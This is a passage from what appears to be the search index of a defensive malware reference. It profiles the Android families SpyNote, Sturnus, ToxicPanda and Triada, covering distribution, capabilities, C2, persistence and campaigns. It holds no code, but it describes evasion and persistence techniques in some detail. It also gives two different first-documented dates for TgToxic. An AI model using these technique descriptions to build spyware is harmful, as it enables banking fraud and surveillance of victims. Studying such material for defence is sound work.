uninstallation</li> <li>Some operators sell harvested data to additional extortion operations</li> </ul>"},{"location":"malware/families/spyloan/#target-regions","title":"Target Regions","text":"Region Details India Largest market, regulatory crackdown ongoing Southeast Asia Philippines, Indonesia, Thailand Latin America Mexico, Colombia, Peru, Chile Africa Kenya, Nigeria, Tanzania South Asia Pakistan, Bangladesh <p>McAfee's research documented the 75% infection increase primarily in South America, Southern Asia, and Africa, regions where access to formal banking is limited and demand for quick loans is high.</p>"},{"location":"malware/families/spyloan/#notable-campaigns","title":"Notable Campaigns","text":"<p>2020-2022: SpyLoan apps emerge across Google Play targeting users in India and Southeast Asia. Multiple reports of harassment and extortion surface.</p> <p>2023: ESET publishes research on predatory lending apps documenting the global spread and the social engineering techniques used to obtain excessive permissions.</p> <p>2024, November: McAfee documents the global scope: 15 active apps with 8M+ installs, 75% increase in infections Q2-Q3 2024. Google removes identified apps but new variants continue to appear.</p>"},{"location":"malware/families/spyloan/#references","title":"References","text":""},{"location":"malware/families/spynote/","title":"SpyNote","text":"<p>SpyNote is a freely available Android Remote Access Trojan (RAT) builder that has been circulating on underground forums since 2016. Its significance comes not from technical sophistication but from accessibility: anyone with basic technical skills can generate a fully functional Android implant capable of camera access, microphone recording, keylogging, SMS interception, and real-time location tracking. The builder's source code was leaked publicly in October 2022, causing an immediate surge in deployments. Since then, SpyNote has been repurposed beyond its original RAT functionality into a banking trojan with overlay attack capabilities, targeting financial institutions across Europe and beyond.</p>"},{"location":"malware/families/spynote/#overview","title":"Overview","text":"Attribute Details First Seen July 2016 Status Active, large and growing sample count Type Remote Access Trojan (RAT), banking trojan (later variants) Attribution Original author unknown; CypherRat variant sold by a developer via Telegram before source leak Aliases SpyNote, SpyMax, CypherRat (commercial variant), SpyNote.C Platform Android"},{"location":"malware/families/spynote/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Palo Alto Networks' Unit 42 first documented SpyNote in July 2016 after the builder appeared on underground forums. The tool provided a Windows-based GUI application that generated customized Android APKs with embedded RAT functionality. At the time, it was comparable to DroidJack and OmniRat, other Android RAT builders.</p> <p>SpyNote evolved through several versions:</p> Version Period Key Change SpyNote v1-v5 2016-2020 Basic RAT, free distribution on forums SpyNote v6 / CypherRat 2021-2022 Enhanced version sold via Telegram by a developer using cryptocurrency payments through Sellix. Added banking capabilities, accessibility abuse, and overlay attacks SpyNote.C (post-leak) October 2022-present CypherRat source code leaked on GitHub after scamming incidents in hacking forums. Mass adoption by independent operators <p>The October 2022 source code leak was the inflection point. ThreatFabric documented that after the leak, SpyNote sample counts increased dramatically as actors worldwide began compiling their own builds. The malware went from a niche RAT to one of the most commonly encountered Android threats.</p>"},{"location":"malware/families/spynote/#distribution","title":"Distribution","text":"<p>SpyNote payloads reach targets through multiple low-cost channels. There is no centralized Malware-as-a-Service operation: each operator handles their own distribution.</p> Vector Details Smishing SMS messages with links to fake app download pages. Messages typically impersonate banks, delivery services, or system updates Phishing sites Fake websites impersonating Google Play Store, banking apps, or popular applications Trojanized APKs SpyNote payloads bundled with or disguised as legitimate apps, distributed through third-party app stores and file-sharing sites Social engineering Manual distribution through social media, messaging apps, or targeted messages Fake banking apps Cleafy documented campaigns where SpyNote was distributed as fake banking apps from major European institutions <p>Because the builder is free and requires no technical backend, the distribution channels are as varied as the operators. Some campaigns target specific banks in specific countries; others cast a wide net with generic lures.</p>"},{"location":"malware/families/spynote/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/spynote/#core-rat-functionality","title":"Core RAT Functionality","text":"<p>SpyNote's base capabilities have remained consistent across versions:</p> Capability Implementation Camera Activate front and rear cameras for photo and video capture Microphone Record ambient audio, record phone calls Keylogging Capture keystrokes via accessibility service SMS Read, intercept, and send SMS messages (2FA bypass) Call log Exfiltrate call history Contacts Steal contact list Location Real-time GPS tracking File manager Browse, download, upload, and delete files on device storage App management Install, uninstall, and list applications Screen capture Record screen using MediaProjection API Clipboard Monitor and capture clipboard contents Notifications Intercept notifications via NotificationListenerService Device info Collect IMEI, model, OS version, network info, battery status Remote shell Execute commands on the device"},{"location":"malware/families/spynote/#banking-trojan-extensions-cypherrat-spynotec","title":"Banking Trojan Extensions (CypherRat / SpyNote.C)","text":"<p>ThreatFabric's analysis documented the banking capabilities added in the CypherRat variant:</p> Capability Implementation Overlay attacks Display fake login screens over targeted banking and cryptocurrency apps 2FA interception Intercept SMS OTPs and capture authenticator app codes via accessibility Credential theft Harvest credentials from overlay injects and keylogger data Automated actions Use accessibility to perform actions within banking apps on behalf of the attacker Target list Impersonates major financial institutions including HSBC, Deutsche Bank, Kotak Bank, Nubank, and others"},{"location":"malware/families/spynote/#targeted-applications","title":"Targeted Applications","text":"<p>Cleafy documented SpyNote campaigns targeting:</p> Category Examples Banking HSBC, Deutsche Bank, Kotak Bank, Nubank, various European and Asian banks Cryptocurrency Wallet apps, exchange apps Social media WhatsApp, Facebook, Instagram Email Gmail, Outlook Payment Google Pay, PayPal"},{"location":"malware/families/spynote/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/spynote/#accessibility-service-abuse","title":"Accessibility Service Abuse","text":"<p>SpyNote's core functionality depends on the Android Accessibility Service. On first launch, the implant aggressively prompts the user to grant accessibility access through repeated dialogs. Once granted, the accessibility service enables:</p> <ul> <li>Keylogging across all applications</li> <li>Auto-granting of additional permissions without user interaction</li> <li>Overlay injection for credential theft</li> <li>Prevention of uninstallation (intercepts attempts to open settings or uninstall the app)</li> <li>Automatic re-enabling of accessibility if the user disables it</li> </ul>"},{"location":"malware/families/spynote/#persistence-and-anti-removal","title":"Persistence and Anti-Removal","text":"<p>SpyNote implements aggressive persistence techniques:</p> Technique Implementation Die-hard services Two background services (documented by F-Secure as \"die-hard services\") that monitor each other and restart if killed Anti-uninstall Accessibility service intercepts taps on uninstall dialogs and closes them, or navigates back to home screen Boot persistence <code>RECEIVE_BOOT_COMPLETED</code> receiver restarts services after reboot Battery optimization bypass Requests exemption from battery optimization to prevent the OS from killing background services Notification hiding Hides its notification or disguises it as a system notification <p>Removing SpyNote from an infected device often requires booting into safe mode or using ADB, because the accessibility service actively prevents normal uninstallation.</p>"},{"location":"malware/families/spynote/#c2-communication","title":"C2 Communication","text":"<p>SpyNote uses a custom TCP-based protocol to communicate with the operator's C2 server:</p> <ul> <li>Connection over raw TCP socket (default ports vary by build)</li> <li>Data serialized and transmitted in a custom binary format</li> <li>Operator uses the SpyNote desktop client (Windows) to view connected devices, issue commands, and receive data</li> <li>No relay infrastructure or proxy chains: the implant connects directly to the operator's server, making C2 infrastructure easy to identify but also trivially replaceable</li> </ul>"},{"location":"malware/families/spynote/#anti-analysis","title":"Anti-Analysis","text":"Technique Implementation Class name obfuscation All class names obfuscated in compiled builds Junk code Dead code paths inserted to slow static analysis Anti-emulator Checks for emulator properties (build strings, hardware characteristics, SIM state) and avoids execution in analysis environments String encryption Critical strings encrypted at compile time, decrypted at runtime <p>The obfuscation is moderate compared to commercial spyware like FinSpy. Most samples are analyzable with standard Android reverse engineering tools (jadx, Frida, APKTool) with moderate effort.</p>"},{"location":"malware/families/spynote/#builder-architecture","title":"Builder Architecture","text":"<p>The SpyNote builder is a Windows desktop application that generates Android APKs. The operator specifies:</p> <ul> <li>C2 server address and port</li> <li>App name, icon, and package name (for disguising the payload)</li> <li>Which permissions and capabilities to enable</li> <li>Whether to bind the payload to a legitimate APK</li> </ul> <p>The builder does not require Android development knowledge. The operator fills in configuration fields and clicks \"Build,\" producing a ready-to-deploy APK.</p>"},{"location":"malware/families/spynote/#known-deployments-and-targets","title":"Known Deployments and Targets","text":"<p>Unlike commercial spyware with a defined client list, SpyNote is used by thousands of independent operators worldwide. Documented campaigns include:</p> Campaign/Context Targets Period Source European banking campaign Customers of major European banks (HSBC, Deutsche Bank) 2022-2023 ThreatFabric Italian banking targets Italian financial institutions 2023 Cleafy Cryptocurrency theft Crypto wallet users 2021-present Fortinet Generic RAT operations Individual targets (stalkerware, personal surveillance) 2016-present Various Natural disaster lures Users in regions affected by earthquakes and eruptions (social engineering) 2023 BleepingComputer <p>The majority of SpyNote deployments are never publicly reported. The free availability of the builder means it is used for everything from state-level operations in low-capability countries to individual stalkerware cases.</p>"},{"location":"malware/families/spynote/#notable-campaigns-and-discoveries","title":"Notable Campaigns and Discoveries","text":"<p>July 2016: Palo Alto Networks' Unit 42 publishes the first analysis of SpyNote after the builder leaks on underground forums. They note its similarity to DroidJack and OmniRat, warning that active attacks are likely imminent.</p> <p>2020-2021: SpyNote v6 evolves into CypherRat, sold through Telegram channels using cryptocurrency. The developer adds banking trojan features including overlay attacks and accessibility-based credential theft.</p> <p>October 2022: CypherRat source code is leaked on GitHub after scamming incidents between the developer and buyers on underground forums. The leak triggers a massive increase in SpyNote deployments worldwide.</p> <p>January 2023: ThreatFabric publishes \"SpyNote: Spyware with RAT capabilities targeting Financial Institutions\", documenting the evolution from simple RAT to banking trojan and the impact of the source code leak on the threat landscape.</p> <p>2023: Cleafy documents ongoing SpyNote campaigns targeting European financial institutions with increasingly sophisticated social engineering, including fake SMS messages directing users to install \"new certified banking apps.\"</p> <p>2023: SpyNote is distributed through fake volcano eruption alerts and earthquake warnings, exploiting natural disaster fears for social engineering.</p> <p>2023-present: F-Secure documents SpyNote's die-hard service architecture, detailing the anti-removal mechanisms that make the malware difficult to uninstall without ADB or safe mode access. SpyNote continues to rank among the most commonly detected Android RATs worldwide.</p> <p>September 2024, Gigabud infrastructure connection: Zimperium zLabs revealed that Gigabud (a banking credential stealer) and SpyNote share distribution infrastructure, suggesting coordination by a single threat actor group. The investigation identified 79 phishing sites, 11 C2 servers, and targeting of 50+ financial apps (40+ banks, 10 crypto platforms). Both families were protected by Virbox packer. This infrastructure overlap indicates SpyNote is being deployed alongside specialized banking credential stealers in coordinated campaigns rather than operating purely as a standalone RAT.</p>"},{"location":"malware/families/spynote/#references","title":"References","text":""},{"location":"malware/families/sturnus/","title":"Sturnus","text":"<p>Sturnus is a privately operated Android banking trojan discovered by ThreatFabric in November 2025. Unlike most modern Android banking malware sold as MaaS, Sturnus appears to be operated exclusively by its developers. Its most notable capability is the interception of content from encrypted messaging apps, including WhatsApp, Telegram, and Signal, by reading screen content via the Accessibility Service after messages are decrypted on-device. This technique completely sidesteps end-to-end encryption without needing to break any cryptographic protocol.</p>"},{"location":"malware/families/sturnus/#overview","title":"Overview","text":"Attribute Details First Seen November 2025 Status Active, in evaluation/tuning phase Type Banking trojan, device takeover Attribution Privately operated (not MaaS) Distribution Unknown (under investigation)"},{"location":"malware/families/sturnus/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Sturnus has no known code lineage to existing Android banking trojan families. ThreatFabric's analysis identifies it as an independently developed project. The private operation model sets it apart from the dominant MaaS trend in the Android banking malware ecosystem, where families like Octo, Hook, and Medusa are rented to affiliates. Sturnus operators appear to control the full attack chain themselves, from development to deployment to fraud execution.</p> <p>At the time of discovery, ThreatFabric assessed Sturnus as being in an evaluation or tuning phase, suggesting the operators are refining their techniques before scaling operations.</p>"},{"location":"malware/families/sturnus/#distribution","title":"Distribution","text":"<p>Distribution vectors have not been publicly documented in detail. ThreatFabric's initial disclosure focused on the malware's post-installation capabilities rather than delivery mechanisms. Given the private operational model, distribution is likely targeted rather than broad, possibly through spear-phishing or social engineering campaigns directed at specific victims.</p>"},{"location":"malware/families/sturnus/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/sturnus/#core-features","title":"Core Features","text":"Capability Implementation Encrypted message capture Reads screen content via Accessibility Service after decryption occurs on-device Device takeover Full remote control of infected devices Text injection Injects text into fields without physical interaction Screen blackout Blacks out device screen during fraud operations to hide activity Accessibility abuse Leverages Accessibility Service for screen reading, input simulation, and overlay detection"},{"location":"malware/families/sturnus/#encrypted-messaging-interception","title":"Encrypted Messaging Interception","text":"<p>The signature capability of Sturnus is its approach to capturing content from end-to-end encrypted messaging applications. Rather than attempting to break the encryption itself, Sturnus exploits a fundamental reality of encrypted messaging: messages must be decrypted on the device for the user to read them. Once decrypted and displayed on screen, the Accessibility Service can read the content just as it would read any other on-screen text.</p> <p>ThreatFabric documented that Sturnus targets:</p> <ul> <li>WhatsApp: Captures message content after rendering</li> <li>Telegram: Reads decrypted messages from the screen</li> <li>Signal: Intercepts displayed message content</li> </ul> <p>This technique is not a cryptographic attack. It is an on-device content capture that operates after the encryption layer has already done its job. The Accessibility Service provides a legitimate API for reading screen content, originally designed for assistive technology, and Sturnus repurposes it for surveillance. For more on how Android malware abuses this permission, see Accessibility Abuse.</p>"},{"location":"malware/families/sturnus/#device-takeover","title":"Device Takeover","text":"<p>Sturnus provides full device takeover capability, allowing operators to:</p> <ol> <li>Navigate the device remotely as if holding it</li> <li>Inject text into any input field without physical interaction</li> <li>Black out the device screen during fraud operations so the victim sees nothing</li> <li>Execute banking fraud while the device appears powered off or inactive</li> </ol> <p>The screen blackout technique is shared with other device takeover trojans like Octo and Hook, where the operator dims brightness to zero and displays a black overlay to mask remote activity.</p>"},{"location":"malware/families/sturnus/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/sturnus/#c2-communication","title":"C2 Communication","text":"<p>Technical details of Sturnus's C2 infrastructure have not been fully disclosed by ThreatFabric in the initial publication. Further technical indicators may emerge as the family matures beyond its current evaluation phase.</p>"},{"location":"malware/families/sturnus/#anti-analysis","title":"Anti-Analysis","text":"<p>As a privately operated trojan still in its tuning phase, detailed anti-analysis techniques have not yet been extensively documented. The private operation model itself serves as a form of evasion, as the limited sample distribution makes it harder for security vendors to obtain and analyze specimens compared to widely distributed MaaS families.</p>"},{"location":"malware/families/sturnus/#target-regions","title":"Target Regions","text":"Region Status Southern Europe Primary target region Central Europe Primary target region <p>ThreatFabric's report identifies Southern and Central Europe as the current target geography. The specific financial institutions targeted have not been publicly enumerated.</p>"},{"location":"malware/families/sturnus/#notable-campaigns","title":"Notable Campaigns","text":"<p>November 2025: ThreatFabric publishes the discovery of Sturnus, highlighting its ability to capture content from encrypted messaging apps by reading screen content via Accessibility Service. The trojan is assessed as being in an evaluation/tuning phase with a private operational model targeting Southern and Central European victims.</p>"},{"location":"malware/families/sturnus/#related-families","title":"Related Families","text":"<p>Sturnus joins a growing set of Android banking trojans with full device takeover capability. Octo pioneered accessible remote control through MediaProjection screen streaming. Hook built on the Cerberus/Ermac lineage to offer VNC-based remote access. Medusa combines screen streaming with keylogging. What distinguishes Sturnus is the explicit focus on encrypted messaging content capture, a capability that other families could theoretically implement but have not prioritized as a core feature.</p> <p>The encrypted messaging interception technique represents a broader trend in mobile malware: rather than attacking the encryption protocol, attackers target the endpoints where data exists in plaintext. This is the same principle behind SparkCat and SpyAgent stealing cryptocurrency seed phrases via OCR from device photos, targeting the moment when sensitive data is visible rather than when it is protected in transit.</p>"},{"location":"malware/families/sturnus/#references","title":"References","text":""},{"location":"malware/families/toxicpanda/","title":"ToxicPanda","text":"<p>ToxicPanda is a banking trojan that emerged in late 2024, representing the geographic expansion of Chinese-speaking threat actors from Southeast Asian targets into European and Latin American financial institutions. Cleafy first identified the family in October 2024, initially associating it with TgToxic before determining it was a distinct, stripped-down variant with its own command set. Despite being in early development, the botnet grew rapidly to over 1,500 infected devices, with Italy accounting for more than half of all infections.</p>"},{"location":"malware/families/toxicpanda/#overview","title":"Overview","text":"Attribute Details First Seen October 2024 Last Seen Active (ongoing campaigns) Status Active, in early development, rapidly expanding Type Banking trojan Attribution Chinese-speaking threat actor(s), likely connected to TgToxic operators Aliases TgToxic variant Predecessor TgToxic (originally targeting Southeast Asia)"},{"location":"malware/families/toxicpanda/#vendor-names","title":"Vendor Names","text":"Vendor Name Cleafy ToxicPanda ThreatFabric ToxicPanda Trend Micro TgToxic / AndroidOS_TgToxic Intel 471 TgToxic ESET Android/Spy.Banker.TgToxic Kaspersky HEUR:Trojan-Banker.AndroidOS.TgToxic BitSight ToxicPanda"},{"location":"malware/families/toxicpanda/#origin-and-lineage","title":"Origin and Lineage","text":"<p>ToxicPanda descends from TgToxic, an Android banking trojan that Trend Micro first documented in February 2023. TgToxic originally targeted users in Taiwan, Thailand, and Indonesia, focusing on cryptocurrency wallets and regional banking apps. Its distinguishing characteristic was abuse of the Easyclick legitimate test automation framework to script UI interactions for automated fraud.</p> <p>Cleafy's analysis determined that ToxicPanda shares 61 commands with TgToxic, confirming the same threat actor or close affiliates are behind both families. ToxicPanda is a stripped-down version of its predecessor: it removes TgToxic's Automatic Transfer System (ATS), Easyclick framework integration, and obfuscation routines, while introducing 33 new commands of its own. This simplification suggests the actors rebuilt the trojan for a new target region, prioritizing manual On-Device Fraud over TgToxic's automation.</p> <p>Intel 471 later tracked continued evolution of the TgToxic family in parallel, with updates adding domain generation algorithms (DGA) and dead drop resolvers using community forum profiles for C2 resilience.</p>"},{"location":"malware/families/toxicpanda/#distribution","title":"Distribution","text":"<p>ToxicPanda's distribution methods target individual banking customers through standard social engineering.</p> Vector Details Fake app pages Phishing sites mimicking Google Play or official bank app download pages Sideloading lures Social engineering to convince victims to install APKs outside official stores Third-party app stores APKs uploaded to unofficial Android markets <p>Cleafy noted that the distribution infrastructure appears less mature than established European MaaS operations, consistent with a threat actor expanding into an unfamiliar geographic region.</p>"},{"location":"malware/families/toxicpanda/#capabilities","title":"Capabilities","text":"<p>ToxicPanda focuses on manual On-Device Fraud (ODF) via accessibility, giving operators direct control of the victim device for real-time transaction manipulation.</p> Capability Implementation On-Device Fraud (ODF) Remote account takeover directly on the infected device via accessibility service OTP interception Intercepts one-time passwords from SMS and authenticator apps, bypassing 2FA Overlay attacks Credential phishing via overlay injection over target banking apps Remote control Manual device interaction through accessibility for navigating banking apps SMS interception Read and forward SMS messages for OTP capture App listing Enumerate installed applications to identify targets Device info collection Exfiltrate device fingerprint, SIM info, installed apps Screenshot capture Capture device screen state during fraud operations"},{"location":"malware/families/toxicpanda/#comparison-to-tgtoxic","title":"Comparison to TgToxic","text":"Feature TgToxic ToxicPanda ATS (Automated Transfer System) Present Removed Easyclick automation Present Removed Obfuscation routines Present Removed Manual ODF Limited Primary fraud method Shared commands 61 61 New commands N/A 33 Target region Southeast Asia Europe, Latin America <p>The removal of ATS and automation in favor of manual ODF indicates the operators are adapting to European banking security controls, which more aggressively detect automated transaction patterns. Manual fraud via remote access is harder for anti-fraud systems to distinguish from legitimate user behavior.</p>"},{"location":"malware/families/toxicpanda/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/toxicpanda/#accessibility-abuse","title":"Accessibility Abuse","text":"<p>ToxicPanda's On-Device Fraud relies entirely on Android's accessibility service:</p> <ol> <li>Victim grants accessibility permission after social engineering</li> <li>Malware auto-grants additional permissions (SMS, phone)</li> <li>Operators connect to the device for interactive sessions</li> <li>Accessibility actions navigate banking apps, initiate transfers, and approve transactions</li> <li>OTP codes intercepted from SMS or captured from notification bar</li> </ol>"},{"location":"malware/families/toxicpanda/#c2-communication","title":"C2 Communication","text":"<p>ToxicPanda uses HTTP-based communication with its C2 infrastructure:</p> <ul> <li>Bot registers with device fingerprint on infection</li> <li>Retrieves target app list and configuration</li> <li>Operators issue commands for interactive fraud sessions</li> <li>Stolen credentials and OTPs exfiltrated to C2</li> </ul>"},{"location":"malware/families/toxicpanda/#tgtoxic-c2-evolution-parallel-development","title":"TgToxic C2 Evolution (Parallel Development)","text":"<p>While ToxicPanda uses relatively straightforward C2, the parent TgToxic family has evolved its infrastructure significantly. Intel 471 documented three phases:</p> Phase Technique Details Phase 1 Hardcoded domains C2 addresses embedded in malware configuration Phase 2 Dead drop resolvers Encrypted C2 addresses hidden in Atlassian community forum user profiles; malware selects a forum URL from configuration, retrieves the profile, and decrypts the C2 address Phase 3 DGA Domain generation algorithm creates dynamic C2 domains, discovered in December 2024 samples <p>The dead drop resolver technique extends sample lifespan: as long as the forum profile remains active, the C2 can be rotated without updating the malware. The DGA further increases resilience by generating multiple candidate domains that can be registered on demand.</p>"},{"location":"malware/families/toxicpanda/#anti-analysis","title":"Anti-Analysis","text":"Technique Method Emulator detection Enhanced hardware and sensor checks in TgToxic variants Minimal obfuscation ToxicPanda specifically strips obfuscation, suggesting rapid deployment was prioritized over stealth Dynamic C2 Parent TgToxic uses DGA and dead drop resolvers for infrastructure resilience"},{"location":"malware/families/toxicpanda/#target-regions-and-financial-institutions","title":"Target Regions and Financial Institutions","text":"<p>ToxicPanda represents a notable geographic pivot, with Chinese-speaking actors targeting European and Latin American banks for the first time.</p> Region Share of Infections Details Italy 56.8% Largest concentration of infected devices, multiple Italian banks targeted Portugal 18.7% Second-largest infection base Hong Kong 4.6% Possible holdover from original TgToxic targeting Spain 3.9% Spanish banking institutions Peru 3.4% Latin American expansion <p>Cleafy identified 16 targeted banking institutions across these regions. BitSight's 2025 follow-up study showed the botnet continuing to grow, with Portugal and Spain becoming primary targets and the total device count more than doubling.</p> <p>The Chinese-speaking attribution is unusual for banking fraud operations targeting Europe and Latin America, a space traditionally dominated by Russian-speaking and Eastern European actors. This expansion suggests either a deliberate market entry by the TgToxic operators or a sale/sharing of the codebase with actors operating in these regions.</p>"},{"location":"malware/families/toxicpanda/#notable-campaigns","title":"Notable Campaigns","text":"<p>July 2022: Trend Micro first documents TgToxic targeting users in Taiwan, Thailand, and Indonesia via fake cryptocurrency and banking apps, using the Easyclick automation framework for credential theft and automated transactions.</p> <p>October 2024: Cleafy identifies ToxicPanda as an anomalous campaign initially attributed to TgToxic. Analysis reveals significant code differences, and Cleafy begins tracking it as a separate family. Over 1,500 infected devices identified across Italy, Portugal, Spain, Hong Kong, and Peru.</p> <p>November 2024: ToxicPanda receives broad coverage following Cleafy's publication. Security researchers note the unusual Chinese-speaking attribution for a European-focused banking trojan and the stripped-down nature compared to TgToxic.</p> <p>December 2024: Intel 471 discovers TgToxic variants incorporating DGA for C2 resilience, representing the third generation of C2 evasion techniques after hardcoded domains and dead drop resolvers.</p> <p>Early 2025: BitSight TRACE research reports the botnet has more than doubled in size, with Portugal and Spain overtaking Italy as primary infection targets. The geographic distribution continues to shift as the operators expand their European footprint.</p>"},{"location":"malware/families/toxicpanda/#references","title":"References","text":""},{"location":"malware/families/triada/","title":"Triada","text":"<p>Triada is a system-level Android trojan that evolved from a sophisticated rooting malware into a supply chain threat pre-installed in the firmware of budget Android devices. First identified by Kaspersky in 2016, it was the first malware observed injecting code into the Android Zygote process, the parent from which every application forks. By 2017, Triada had shifted from post-sale infection to pre-installation: Google confirmed that a third-party vendor in the OEM supply chain was inserting Triada into system images before devices reached consumers. As of 2025, Kaspersky continues to find new Triada variants pre-installed on counterfeit smartphones sold through online marketplaces.</p>"},{"location":"malware/families/triada/#overview","title":"Overview","text":"Attribute Details First Seen March 2016 Status Active, new variants discovered in 2025 Type System-level trojan, supply chain backdoor Attribution Unknown threat actors; supply chain compromise attributed to a vendor using the name Yehuo or Blazefire (per Google) Aliases Triada, Backdoor.AndroidOS.Triada (Kaspersky), Android.Triada (Dr.Web) Platform Android"},{"location":"malware/families/triada/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Kaspersky published the initial Triada analysis in March 2016, calling it the most advanced mobile trojan they had ever analyzed. At that time, Triada was a modular trojan that gained root access through known exploits and then injected itself into the Zygote process to persist across all applications. Its primary monetization was intercepting and modifying outgoing SMS messages for premium SMS fraud, redirecting payments from in-app purchases to attacker-controlled accounts.</p> <p>By 2017, the malware's delivery model changed entirely. Rather than exploiting devices post-sale, Triada began appearing pre-installed in the firmware of budget Android devices. Google's Android security team published their analysis in June 2019, confirming that a third-party vendor (identified as Yehuo or Blazefire) had injected Triada into system images provided to OEMs. When manufacturers outsourced the implementation of features not included in the Android Open Source Project (like face unlock), the contracted vendor returned system images with Triada embedded. Krebs on Security covered the supply chain implications in detail.</p> <p>The 2025 variant represents a further evolution. Kaspersky's April 2025 analysis found Triada (Backdoor.AndroidOS.Triada.z) pre-installed on counterfeit Android smartphones sold through online marketplaces, with over 4,500 infections detected worldwide. The threat actors had transferred approximately $270,000 in cryptocurrency through wallets linked to the operation between June 2024 and March 2025.</p>"},{"location":"malware/families/triada/#distribution","title":"Distribution","text":"<p>Triada's distribution model is distinct from virtually every other malware family: rather than tricking users into installing a malicious app, the malware is already present when the device is first powered on.</p>"},{"location":"malware/families/triada/#supply-chain-compromise","title":"Supply Chain Compromise","text":"Phase Method 2016 Post-sale rooting: exploits known kernel vulnerabilities to gain root, then injects into Zygote 2017-2019 OEM supply chain: third-party vendor inserts Triada into system images provided to budget phone manufacturers 2024-2025 Counterfeit devices: pre-installed in firmware of fake smartphones sold through online marketplaces <p>The supply chain infection occurs at a point in the manufacturing process where the OEM has contracted an outside vendor to customize the firmware. The vendor, either compromised or complicit, inserts Triada into the system partition before the image is flashed onto devices. Because Triada resides in the system partition, it cannot be removed through a factory reset.</p>"},{"location":"malware/families/triada/#which-devices","title":"Which Devices","text":"<p>Triada primarily targets budget Android devices from lesser-known manufacturers. These devices are sold through:</p> <ul> <li>Online marketplaces and e-commerce platforms</li> <li>Unauthorized retailers</li> <li>Markets in developing regions where budget Android phones are prevalent</li> </ul> <p>The 2025 campaign specifically targets counterfeit phones that visually imitate well-known brands but run modified firmware with Triada embedded.</p>"},{"location":"malware/families/triada/#capabilities","title":"Capabilities","text":"<p>Triada's capabilities have expanded significantly across its versions.</p>"},{"location":"malware/families/triada/#early-versions-2016","title":"Early Versions (2016)","text":"Capability Implementation Zygote injection Inject code into the Zygote process, gaining execution context in every newly launched application SMS hijacking Intercept and modify outgoing SMS messages to redirect premium SMS payments Ad fraud Inject advertising into applications and browsers Module loading Download and execute additional modules from C2"},{"location":"malware/families/triada/#supply-chain-versions-2017-2019","title":"Supply Chain Versions (2017-2019)","text":"Capability Implementation System-level persistence Installed in system partition, survives factory reset Backdoor access Remote command execution from C2 App installation Silently download and install additional APKs Data exfiltration Steal device identifiers, account information Ad injection Insert advertisements across applications Browser manipulation Redirect browser traffic, inject content"},{"location":"malware/families/triada/#current-versions-2024-2025","title":"Current Versions (2024-2025)","text":"<p>Kaspersky's 2025 analysis documents an expanded set of capabilities:</p> Capability Implementation Cryptocurrency theft Replace wallet addresses in clipboard to redirect crypto transactions SMS interception Read, send, and delete SMS messages (including OTP interception) Call manipulation Make calls and intercept incoming calls Browser hijacking Replace links in browsers, inject pages Messenger interception Extract messages and media from WhatsApp, Telegram, and other apps Account theft Steal credentials for social media and messaging applications App installation Download and install arbitrary APKs silently DNS manipulation Redirect network requests by modifying DNS resolution Premium SMS fraud Subscribe victims to premium services via SMS <p>The 2025 variant can attack any application running on the device because it operates at the system level with full privileges.</p>"},{"location":"malware/families/triada/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/triada/#zygote-injection-original","title":"Zygote Injection (Original)","text":"<p>The original Triada's most significant technical innovation was Zygote process injection. Zygote is the Android system process that serves as the template for every application process. When a new app launches, the system forks Zygote to create the new process. By injecting code into Zygote, Triada ensured its code was present in every application on the device, providing:</p> <ul> <li>Access to the memory space of every running application</li> <li>Ability to hook and modify function calls within any app</li> <li>Persistence that survives app-level cleanup (only a system wipe removes it)</li> </ul> <p>This existed primarily in the device's RAM, making file-based detection difficult. Kaspersky noted this was the first time such a technique had been observed in the wild, although it had existed as a proof-of-concept.</p>"},{"location":"malware/families/triada/#system-partition-installation-supply-chain","title":"System Partition Installation (Supply Chain)","text":"<p>In the supply chain variant, Triada is compiled into the system image:</p> <ul> <li>Located in <code>/system</code> partition, which is read-only under normal operation</li> <li>Executes with system-level privileges (UID 1000 or root)</li> <li>Cannot be removed through factory reset because the factory image itself contains the malware</li> <li>Only reflashing with a clean firmware image removes it</li> </ul> <p>Google's analysis described the infection as \"inconspicuously included in the system image as third-party code for additional features requested by the OEMs.\"</p>"},{"location":"malware/families/triada/#c2-communication","title":"C2 Communication","text":"<p>Triada uses HTTPS for C2 communication. The C2 infrastructure delivers:</p> <ul> <li>Module updates and new capabilities</li> <li>Tasking instructions (which ads to display, which SMS to intercept)</li> <li>Additional APKs for installation</li> <li>Configuration updates (target lists, wallet addresses)</li> </ul>"},{"location":"malware/families/triada/#monetization","title":"Monetization","text":"Revenue Stream Method Ad fraud Inject ads into legitimate apps, generate fraudulent impressions Premium SMS Subscribe victims to premium services, intercept confirmation SMS to prevent cancellation Cryptocurrency theft Replace wallet addresses in clipboard during copy-paste operations Credential sale Stolen account credentials sold on underground markets Backdoor access Persistent device access can be sold or leased to other threat actors <p>The 2025 variant's cryptocurrency theft alone generated $270,000 in approximately nine months.</p>"},{"location":"malware/families/triada/#known-deployments-and-targets","title":"Known Deployments and Targets","text":"Region Context Period Global (budget devices) Pre-installed on budget Android devices from various manufacturers 2017-2019 Russia (primary) Highest concentration of 2025 variant infections 2024-2025 UK, Netherlands, Germany Secondary infection clusters 2024-2025 Brazil, UAE Additional infection clusters 2024-2025 China (manufacturing) Source of supply chain compromise in OEM firmware 2017-present <p>Unlike targeted spyware, Triada is indiscriminate: anyone who purchases an affected device is compromised. The economic incentive is volume-based fraud rather than intelligence collection.</p>"},{"location":"malware/families/triada/#notable-campaigns-and-discoveries","title":"Notable Campaigns and Discoveries","text":"<p>March 2016: Kaspersky publishes the initial Triada analysis, identifying it as the most advanced mobile trojan at the time. The Zygote injection technique is documented for the first time in the wild.</p> <p>2017: Triada evolves from a rooting trojan to a supply chain threat. Google begins identifying pre-installed Triada variants on new devices.</p> <p>June 2019: Google's Android security team publishes \"PHA Family Highlights: Triada\", confirming that a third-party vendor (Yehuo/Blazefire) injected Triada into system images during the manufacturing process. Google details how they worked with OEMs to distribute clean updates and implemented the Build Test Suite to scan system images for threats.</p> <p>June 2019: Krebs on Security reports on the supply chain attack, tracing the compromise through the Android OEM ecosystem and highlighting the systemic risk in budget device manufacturing.</p> <p>August 2021: Kaspersky discovered Triada embedded inside a modified WhatsApp build (FMWhatsApp) distributed via third-party app stores, with the 